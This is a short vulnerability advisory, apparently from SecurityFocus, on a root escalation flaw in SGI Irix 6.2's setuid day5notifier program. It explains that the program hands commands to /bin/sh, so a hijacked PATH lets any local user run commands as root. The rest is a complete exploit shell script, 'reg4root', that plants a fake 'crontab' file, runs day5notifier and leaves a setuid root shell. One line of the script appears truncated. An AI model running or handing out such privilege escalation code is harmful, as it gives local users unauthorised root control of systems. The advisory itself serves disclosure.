source: http://www.securityfocus.com/bid/345/info

A vulnerability exists in the day5notifier program, shipped with Irix 6.2 from Silicon Graphics Inc. This program will allow any user to run any command as root.

day5notifier wisely replaces a number of system() calls with execve() calls. However, the code was translated to run a copy of /bin/sh as the processor in the execve. As such, all the security problems associated with using a system() call in a setuid program remain.

#!/bin/sh
# reg4root - Register me for Root!
#
# Exploit a bug in SGI's Registration Software
#
# -Mike Neuman
# mcn@EnGarde.com
# 8/6/96

MYPWD=`pwd`
mkdir /tmp/emptydir.$$
cd /tmp/emptydir.$$

cat <<EOF >crontab
cp /bin/sh ./suidshell
chmod 4755 suidshell
EOF
d +x crontab

PATH=.:$PATH
export PATH

/var/www/htdocs/WhatsNew/CustReg/day5notifier -procs 0

./suidshell

cd $MYPWD
rm -rf /tmp/emptydir.$$